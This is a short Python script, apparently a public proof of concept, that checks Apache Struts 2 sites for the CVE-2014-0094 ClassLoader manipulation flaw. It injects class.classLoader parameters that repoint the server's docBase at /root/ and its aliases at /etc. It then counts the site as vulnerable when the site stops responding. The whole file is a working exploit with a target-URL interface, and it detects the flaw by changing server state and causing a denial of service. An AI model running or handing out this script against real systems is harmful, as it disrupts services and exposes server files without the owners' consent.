import requests
import optparse
import sys
import time
# Usage python struts-0daycheck.py -u http://localhost:8080 -t /struts2-blank/example/HelloWorld.action
# psc4re's script to check for Apache Struts Zeroday CVE-2014-0050, CVE-2014-0094
def zeroday_check(tgtURL, tgtPATH):
	urlcheck = tgtURL+""+tgtPATH
	print "[+] Injecting strings to: "+urlcheck
	checkstrings = {'class.classLoader.resources.dirContext.docBase=/root/':'1','class[\'classLoader\'][\'resources\'][\'dirContext\'][\'aliases\']=/etc':'2','class.classLoader.resource.dircontext.docBase=someText':'3'} 
	for i in checkstrings:
		resp = requests.get(urlcheck,params=i)
		print "[+] "+(resp.url)
		time.sleep(4)
		if (resp.status_code!=200):
			resp = requests.get(urlcheck)
			time.sleep(1)
			print "[+] Testing the DDOS"
			if(resp.status_code!=200):
				print "[!] Target was found vulnerable to Struts 0-Day: "+urlcheck
				sys.exit(0)

def main():
	parser = optparse.OptionParser('python %prog -u <website> -t <targetpath>')
	parser.add_option('-u','--url', dest = 'URLstrut',  help ='give the URL eg., http://www.exampe.com or 127.0.0.1:8080')
	parser.add_option('-t', dest = 'tgtPATH', type="string", help ='eg.,/struts2-blank/example/Login.action ')
	(options,args) = parser.parse_args()
	print "[+] Struts String injection started "
	tgtURL = options.URLstrut
	tgtPATH = options.tgtPATH
	if((tgtURL == None) | (tgtPATH == None)):
		print parser.usage
		sys.exit(0)
	if(requests.get(tgtURL+""+tgtPATH).status_code==200):
		zeroday_check(tgtURL, tgtPATH)
	else:
		print "[-] Check the Target URL and Path"
	print "[+] Apache Zero Day struts scan completed"

if __name__ == "__main__":
	main()
